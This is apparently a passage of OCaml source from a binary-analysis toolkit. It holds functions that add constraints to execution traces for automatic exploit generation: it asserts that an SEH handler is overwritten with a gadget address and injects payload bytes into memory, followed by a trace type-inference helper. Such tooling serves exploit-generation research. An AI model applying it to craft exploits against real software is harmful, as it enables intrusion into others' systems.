  let gaddrexp = Int(gaddr, memtype arch) in
  let trace, assertion = hijack_control gaddrexp trace in
  (* Concatenate the assertion and the gadget IL *)
  let trace = BatList.append trace [assertion] in
  let passerts = inject_payload_gen arch (Int(maddr, memtype arch)) (bytes_from_file payloadfile) trace in
  BatList.append trace passerts

(** Transfer control by overwriting sehaddr with gaddr. *)
let add_seh_pivot gaddr sehaddr paddr payload arch trace =
  let mem = Var(find_memv trace) in
  let gaddrexp = Int(gaddr, memtype arch) in
  let sehexp = Load(mem, Int(sehaddr, memtype arch), exp_false, memtype arch) in
  let endtrace = Ast.Comment (endtrace, []) in
  let assertion = Ast.Assert(BinOp(EQ, gaddrexp, sehexp), []) in
  (* Concatenate the assertion and the gadget IL *)
  let trace = BatList.append trace [endtrace; assertion] in
  let passerts = inject_payload_gen arch (Int(paddr, memtype arch)) (string_to_bytes payload) trace in
  BatList.append trace passerts

(** Transfer control by overwriting sehaddr with gaddr. *)
let add_seh_pivot_file gaddr sehaddr paddr payloadfile arch trace =
  let mem = Var(find_memv trace) in
  let gaddrexp = Int(gaddr, memtype arch) in
  let sehexp = Load(mem, Int(sehaddr, memtype arch), exp_false, memtype arch) in
  let endtrace = Ast.Comment (endtrace, []) in
  let assertion = Ast.Assert(BinOp(EQ, gaddrexp, sehexp), []) in
  (* Concatenate the assertion and the gadget IL *)
  let trace = BatList.append trace [endtrace; assertion] in
  let passerts = inject_payload_gen arch (Int(paddr, memtype arch)) (bytes_from_file payloadfile) trace in
  BatList.append trace passerts


(*************************************************************)
(**************** Type Inference on Traces  ******************)
(*************************************************************)

open Var

let add_assignments trace =
  let varset = Hashtbl.create 100 in
  let get_vars_from_stmt =
    let var_visitor = object(self)
      inherit Ast_visitor.nop
      method visit_rvar v =
        let name = Var.name v in
          (try
             let value = match concrete_val name with
               | Some(x) -> x
               | None -> failwith "Unhandled"
             in
             if not (Hashtbl.mem varset name) then
               Hashtbl.add varset name (v,value)
           with Not_found -> ());
          DoChildren
    end
    in
      Ast_visitor.stmt_accept var_visitor
  in
  List.iter
    (fun s ->
       ignore(update_concrete s) ;
       ignore (get_vars_from_stmt s)
    ) trace;
    let assignments = Hashtbl.fold
      (fun _ (var,value) acc ->
         (Ast.Move (var, value, []))::acc
      ) varset []
    in
      BatList.append assignments trace
